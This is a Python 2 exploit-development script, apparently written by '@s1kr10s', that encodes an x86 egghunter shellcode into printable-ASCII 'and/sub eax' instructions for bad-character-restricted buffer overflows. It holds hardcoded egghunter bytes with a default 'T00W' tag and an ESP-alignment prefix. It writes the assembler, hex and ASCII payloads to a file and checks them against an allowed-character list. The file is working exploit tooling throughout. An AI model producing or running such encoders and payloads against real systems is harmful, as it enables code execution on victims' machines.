#!/usr/Bin/python
# -*- coding: utf-8 -*-
import subprocess, os, time
from commands import *

os.system('clear')
log='''

 ╔═╗╔═╗╔═╗╦╦  ╔═╗╔╗╔╔═╗╔═╗╔╦╗╔═╗
 ╠═╣╚═╗║  ║║  ║╣ ║║║║  ║ ║ ║║║╣ 
 ╩ ╩╚═╝╚═╝╩╩  ╚═╝╝╚╝╚═╝╚═╝═╩╝╚═╝
      ╔═╗═╗ ╦╔═╗╦  ╔═╗╦╔╦╗
      ║╣ ╔╩╦╝╠═╝║  ║ ║║ ║ 
      ╚═╝╩ ╚═╩  ╩═╝╚═╝╩ ╩
           @s1kr10s
'''
print log

info='\033[95m'
fail='\033[91m'
end ='\033[0m'

conten=[]
shellcode=[]
inverse=[]
ascii=[]
invalid=[]
inputs=[]
sw=0
flag=0
flag2=0
count=0
strhunter=''
asciiexploit=''
fileout='egg_shellcode.txt'

prefix='''------EAX=0------
and eax,554E4D4A
and eax,2A313235
----ALIGN-ESP----
push esp
pop eax
sub eax,37373741
sub eax,25252569
sub eax,49493272
sub eax,5A5A5A5C
push eax
pop esp
------EAX=0------
and eax,554E4D4A
and eax,2A313235
------CALC-------
'''

prefixsc="254A4D4E55253532312A54582D413737372D692525252D723249492D5C5A5A5A505C254A4D4E55253532312A"
prefixse="\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A\\x54\\x58\\x2D\\x41\\x37\\x37\\x37\\x2D\\x69\\x25\\x25\\x25\\x2D\\x72\\x32\\x49\\x49\\x2D\\x5C\\x5A\\x5A\\x5A\\x50\\x5C\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A"
validos=(
	"25","2A","2D","30","31","32","33","34","35",
	"36","37","38","39","41","42","43","44","45",
	"46","47","48","49","4A","4B","4C","4D","4E",
	"4F","50","51","52","53","54","55","56","57",
	"58","59","5A","5C","61","62","63","64","65",
	"66","67","68","69","6A","6B","6C","6D","6E",
	"6F","70","71","72","73","74","75","76","77",
	"78","79","7A")

opcion = raw_input('\n Auto EggHunter (Y/n): ')

if opcion.upper() == 'N':
	print "\n Ejemplo: \\x37\\x2D\\x69\\x25\\x25\\x25\\x2D\\x72...\n"
	codigo = raw_input(' Valor Hexadecimal a Codificar: ').replace('\\x', ' ')[1:]
	codigosep = codigo.split(" ")
	conmod = (len(codigosep)%4)

	if conmod == 0:
		flag2=1
		conorden = (len(codigosep)/4)
		xxx=0
		for t in range(conorden): # 3 vueltas
			juntador=''
			vueltas=0
			for d in range(4): # 4 vueltas
				juntador += codigosep[xxx]
				xxx+=1
				vueltas+=1
				if vueltas == 4:
					inputs.append('0x'+juntador.lower())
	else:
		print fail+"\n El hexadecimal debe ser divisible por [4]\n"+end
		print fail+" Correcto  : \\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32"+end
		print fail+" Incorrecto: \\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\n"+end
		exit(1)

if flag2 == 1:
	egg = inputs
else:
	opcion2 = raw_input('\n Default Hunter "T00W" (Y/n): ')
	if opcion2.upper() == 'Y': 
		strhunter = "T00W"
		egg = [
			"0xffca8166",
			"0x6a52420f",
			"0x2ecd5802",
			"0x745a053c",
			"0x3054b8ef",
			"0xfa8b5730",
			"0xafea75af",
			"0xe7ffe775"]
	else:
		strhunter = raw_input(' Hunter 4 Bytes: ')
		if len(strhunter) == 4:
			a=strhunter[0].encode("hex")
			b=strhunter[1].encode("hex")
			c=strhunter[2].encode("hex")
			d=strhunter[3].encode("hex")
			egg = [
				"0xffca8166",
				"0x6a52420f",
				"0x2ecd5802",
				"0x745a053c",
				"0x"+b+a+"b8ef",
				"0xfa8b"+d+c,
				"0xafea75af",
				"0xe7ffe775"]
		else:
			print fail+"\n El hunter debe ser igual a 4 bytes.\n"+end
			exit(1)

length=len(egg)

print info+"\n (Si necesita cambiar la lista de caracteres permitidos\n modificar variable CHR de nnm-custom.c y compilar)"+end
if flag2 != 1:
	print "\n EggHunter Tag: [ "+strhunter+" ]\n"
else:
	print "\n"
	
print "   Calcular ShellCode"
print " ☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠"
for i in range(len(egg)):
	length-=1
	if count == 0:
		print " ☠> 0 "+str(egg[length])
		res=getoutput('./nnm-custom 0 '+str(egg[length])+' | egrep "0x" | egrep -v "Start:|End:"')
		conten.append((res))
	else:
		print " ☠> "+str(egg[length+1])+' '+str(egg[length])
		res=getoutput('./nnm-custom '+str(egg[length+1])+' '+str(egg[length])+' | egrep "0x" | egrep -v "Start:|End:"')
		conten.append(res)
	count +=1

print " ☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠"
time.sleep(1)
print " [☠] Generando Archivo..."

if os.path.isfile(fileout):
	getoutput('> '+fileout)

contas=0
for i in range(len(conten)):
	fil1=conten[i].split('-')
	conta1=0
	for j in range(len(fil1)):
		fil2=fil1[j].replace('\n','')
		fil2=fil2.replace(' ','')
		if j > 0:
			out=open(fileout,'a')
			if i == 0 and contas==0:
				out.write('ASSEMBLER\n☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\n'+prefix+'sub eax,'+str(fil2[2:])+'\n')
			else:
				out.write('sub eax,'+str(fil2[2:]).upper()+'\n')
			if conta1 == 0:
				shellcode.append(str(fil2[2:]+'2D50').upper())
			else:
				shellcode.append(str(fil2[2:]+'2D').upper())
			conta1+=1
			contas=1
	out.write('push eax\n')

cont=0
for s in range(len(shellcode)):
	if len(shellcode[s]) == 10:
		cons1=shellcode[s][8]+shellcode[s][9]
		cons2=shellcode[s][6]+shellcode[s][7]
		cons3=shellcode[s][4]+shellcode[s][5]
		cons4=shellcode[s][2]+shellcode[s][3]
		cons5=shellcode[s][0]+shellcode[s][1]
		inverse.append(cons1+cons2+cons3+cons4+cons5)
	else:
		cons0=shellcode[s][10]+shellcode[s][11]
		cons1=shellcode[s][8]+shellcode[s][9]
		cons2=shellcode[s][6]+shellcode[s][7]
		cons3=shellcode[s][4]+shellcode[s][5]
		cons4=shellcode[s][2]+shellcode[s][3]
		cons5=shellcode[s][0]+shellcode[s][1]
		inverse.append(cons0+cons1+cons2+cons3+cons4+cons5)
	cont+=1
sc = ''.join(inverse)
out.write('\nSHELLCODE DEBUG\n☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\n'+prefixsc+sc+'50'+'\n')

c1=0
c2=1
shellcode=[]
for e in range(len(sc)):
	mul=(2*e+2)
	shellcode.append('\\x'+sc[c1]+sc[c2])
	if mul == len(sc):
		break
	c1+=2
	c2+=2
sce = ''.join(shellcode)
out.write('\nSHELLCODE EXPLOIT HEXA\n☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\n'+prefixse+sce+'\\x50'+'\n')

time.sleep(2)
print " [☠] Archivo (egg_shellcode.txt) Creado :-)"

code=prefixse+sce+'\\x50'
ascii=code.split('\\x')
for a in range(len(ascii)):
	if a > 0:
		asciiexploit+=ascii[a].decode("hex")
		if ascii[a] in validos:
			pass
		else:
			flag=1
			invalid.append(ascii[a])
if flag == 1:
	time.sleep(2)
	print ' [☠] '+fail+'BadChar Found-> |'+'|'.join(invalid)+'|\n'+end
else:
	time.sleep(2)
	print " [☠] Shellcode Successfull :)\n"

out.write('\nSHELLCODE EXPLOIT ASCII\n☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\n'+asciiexploit+'\n')
out.close()